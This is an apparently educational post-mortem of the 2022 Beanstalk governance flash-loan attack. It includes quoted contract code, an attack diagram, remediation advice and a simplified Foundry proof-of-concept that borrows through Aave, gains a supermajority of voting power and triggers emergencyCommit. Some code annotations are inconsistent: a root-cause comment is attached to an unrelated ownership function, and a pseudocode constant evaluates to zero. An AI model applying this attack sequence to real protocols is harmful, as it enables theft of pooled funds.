# Beanstalk — Governance Flash Loan Emergency Execution Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-04-17 |
| **Protocol** | Beanstalk Farms |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$182,000,000 (BEAN, 3CRV, LUSD, etc.) |
| **Attacker** | Attacker address unconfirmed |
| **Attack Tx** | Block 14,595,905 |
| **Vulnerable Contract** | BeanStalk/SiloV2Facet [0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5](https://etherscan.io/address/0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5) |
| **Root Cause** | `emergencyCommit()` calculates voting power using the current block Stalk balance rather than a snapshot at proposal time, allowing deposit→vote→withdraw within the same transaction |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-04/Beanstalk_exp.sol) |

---
## 1. Vulnerability Overview

Beanstalk's governance uses the "Stalk" quantity of BEAN/LP tokens deposited in the Silo as voting power. The `emergencyCommit()` function was an emergency proposal execution path that bypassed the standard governance waiting period (7 days) and executed immediately when sufficient vote support was present.

The attacker pre-registered a malicious proposal (BIP-18) 24 hours in advance, then on the day of the attack borrowed $350 million worth of stablecoins via an Aave flash loan. They added liquidity to the Curve pool to obtain BEAN3CRV LP tokens, deposited these into SiloV2 to acquire a massive amount of Stalk (voting power), and used this voting power to immediately pass BIP-18 via `emergencyCommit()`, transferring all protocol assets to the attacker's address.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable Beanstalk governance (pseudocode)
contract BeanstalkGovernance {
    uint256 constant EMERGENCY_COMMIT_THRESHOLD = 2/3; // 2/3 of total Stalk

    function emergencyCommit(uint32 bip) external {
        // ❌ Calculates threshold using current block Stalk balance
        // Flash loan can acquire enough Stalk to meet the threshold
        uint256 userStalk = s.a[msg.sender].s.stalk;
        uint256 totalStalk = s.s.stalk;

        require(
            userStalk * 3 >= totalStalk * 2,  // holds 2/3 or more
            "insufficient stalk"
        );

        // ❌ Immediate execution — any proposal can be executed
        _execute(bip);
    }
}

// ✅ Correct pattern
contract BeanstalkGovernanceFixed {
    // ✅ Flash loan prevention: pin voting power snapshot block to proposal block
    function emergencyCommit(uint32 bip) external {
        BIP storage b = bips[bip];
        // ✅ Use Stalk snapshot at proposal time (not current value)
        uint256 userStalkAtProposal = b.userStalkSnapshot[msg.sender];
        uint256 totalStalkAtProposal = b.totalStalkSnapshot;

        require(
            userStalkAtProposal * 3 >= totalStalkAtProposal * 2,
            "insufficient stalk at proposal time"
        );
        _execute(bip);
    }
}
```

---
### On-Chain Original Code

Source: GitHub — BeanstalkFarms/Beanstalk (commit e9f4991, version just before the attack)


**GovernanceFacet.sol** — entry point:
```solidity
// ❌ Root cause: `emergencyCommit()` calculates voting power using the current block Stalk balance rather than a snapshot at proposal time, allowing deposit→vote→withdraw within the same transaction
    function emergencyCommit(uint32 bip) external {  // ❌ vulnerability
        require(isNominated(bip), "Governance: Not nominated.");
        require(
            block.timestamp >= timestamp(bip).add(C.getGovernanceEmergencyPeriod()),
            "Governance: Too early.");
        require(isActive(bip), "Governance: Ended.");
        require(
            bipVotePercent(bip).greaterThanOrEqualTo(C.getGovernanceEmergencyThreshold()),
            "Governance: Must have super majority."
        );
        _execute(msg.sender, bip, false, true); 
    }
```

**LibDiamond.sol** — related contract:
```solidity
// ❌ Root cause: `emergencyCommit()` calculates voting power using the current block Stalk balance rather than a snapshot at proposal time, allowing deposit→vote→withdraw within the same transaction
    function setContractOwner(address _newOwner) internal {
        DiamondStorage storage ds = diamondStorage();
        address previousOwner = ds.contractOwner;
        ds.contractOwner = _newOwner;
        emit OwnershipTransferred(previousOwner, _newOwner);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[Preparation, 24 hours prior]
    │       75 ETH → BEAN (UniswapV2)
    │       Deposit BEAN into SiloV2 (meet proposalThreshold)
    │       Create BIP-18 proposal
    │           Content: Transfer all Beanstalk assets to attacker wallet
    │
    ├─[Attack day]
    │       Execute Aave flashLoan:
    │           350M DAI + 500M USDC + 150M USDT
    │
    ├─[Inside executeOperation()]
    │       │
    │       ├─ Add liquidity to Curve 3pool → obtain 3CRV
    │       ├─ Add 3CRV to BEAN3CRV pool → obtain BEAN3CRV-f
    │       ├─ SiloV2.deposit(BEAN3CRV-f) → acquire massive Stalk
    │       │       (2/3 or more of total Stalk)
    │       │
    │       ├─ Call emergencyCommit(BIP-18)
    │       │       Attacker Stalk ≥ 2/3 of total Stalk → passes immediately
    │       │       BIP-18 executes: transfers all protocol assets
    │       │
    │       ├─ Remove liquidity from Curve
    │       └─ Repay Aave flash loan
    │
    └─[Loss] ~$182,000,000
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface ILendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface ISiloV2Facet {
    function deposit(address token, uint256 amount, uint256 seasons) external returns (uint256, uint256);
}

interface IBeanstalkGovernance {
    function propose(bytes memory data) external returns (uint32);
    function emergencyCommit(uint32 bip) external;
}

contract ContractTest is Test {
    ILendingPool aave =
        ILendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    ISiloV2Facet silo =
        ISiloV2Facet(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);
    IBeanstalkGovernance governance =
        IBeanstalkGovernance(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);

    IERC20 DAI  = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 BEAN = IERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);

    uint32 bipId;

    function setUp() public {
        vm.createSelectFork("mainnet", 14_595_905);
    }

    function testExploit() public {
        // [Preparation] BEAN → deposit into SiloV2 → submit BIP-18
        vm.warp(block.timestamp - 1 days);
        _setupProposal();
        vm.warp(block.timestamp + 1 days);

        // [Attack] Execute Aave flash loan
        address[] memory assets = new address[](3);
        assets[0] = address(DAI); assets[1] = address(USDC); assets[2] = address(USDT);
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 350_000_000e18; amounts[1] = 500_000_000e6; amounts[2] = 150_000_000e6;
        uint256[] memory modes = new uint256[](3);

        aave.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    function executeOperation(
        address[] calldata,
        uint256[] calldata,
        uint256[] calldata,
        address,
        bytes calldata
    ) external returns (bool) {
        // [Step 1] Obtain 3CRV → obtain BEAN3CRV
        _addLiquidity();

        // [Step 2] Deposit BEAN3CRV into SiloV2 → acquire massive Stalk
        IERC20 bean3crv = IERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
        bean3crv.approve(address(silo), type(uint256).max);
        silo.deposit(address(bean3crv), bean3crv.balanceOf(address(this)), 0);

        // [Step 3] emergencyCommit → BIP-18 executes immediately
        // ⚡ Flash loan secures 2/3+ of Stalk → governance takeover
        governance.emergencyCommit(bipId);

        // [Step 4] Withdraw liquidity and repay flash loan
        _removeLiquidity();
        return true;
    }

    function _setupProposal() internal {
        // Malicious BIP: transfer all protocol assets to attacker
        bytes memory maliciousData = abi.encode("transfer all assets to attacker");
        bipId = governance.propose(maliciousData);
    }

    function _addLiquidity() internal { /* Add liquidity to Curve pool */ }
    function _removeLiquidity() internal { /* Remove liquidity from Curve pool */ }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Governance voting power snapshot absence — `emergencyCommit()` calculates quorum using current block Stalk balance, allowing acquisition, exercise, and return of voting power within a single transaction |
| **CWE** | CWE-362: Race Condition due to Improper Synchronization |
| **OWASP DeFi** | Current-block balance-based governance (voting power without snapshot) |
| **Attack Vector** | Silo deposit → call `emergencyCommit()` (current block Stalk ≥ 2/3) → immediate execution |
| **Precondition** | `emergencyCommit()` uses current block `s.a[msg.sender].s.stalk` rather than a snapshot at proposal time |
| **Impact** | $182M in total protocol assets drained |

---
## 6. Remediation Recommendations

1. **Voting Power Snapshot**: Calculate voting power based on a snapshot taken at the proposal creation block.
2. **Flash Loan Blocking**: Prohibit deposit-vote-withdrawal within the same block.
3. **Remove or Restrict Emergency Execution Path**: Apply a minimum time delay (1–2 days) to emergencyCommit.
4. **Compound Governor Bravo Pattern**: Use a proven governance framework to implement snapshot-based voting.

---
## 7. Lessons Learned

- **Absent snapshot is the root cause**: Flash loans are merely a short-term capital acquisition tool. A whale with sufficient capital could execute the same attack via deposit→vote→withdraw within the same block. The root cause is a design flaw in which `emergencyCommit()` uses the current block balance rather than a snapshot at proposal time as voting power.
- **The paradox of emergencyCommit**: An emergency execution path designed for rapid response becomes a vector for single-transaction takeover when it uses current-balance-based quorum without a timelock.
- **$182M loss**: The Beanstalk attack is a canonical example of the governance snapshot absence vulnerability and had a significant influence on DeFi governance design thereafter.
- **Tornado Cash donation**: The attacker processed a portion of the proceeds through a donation to Ukraine and via Tornado Cash.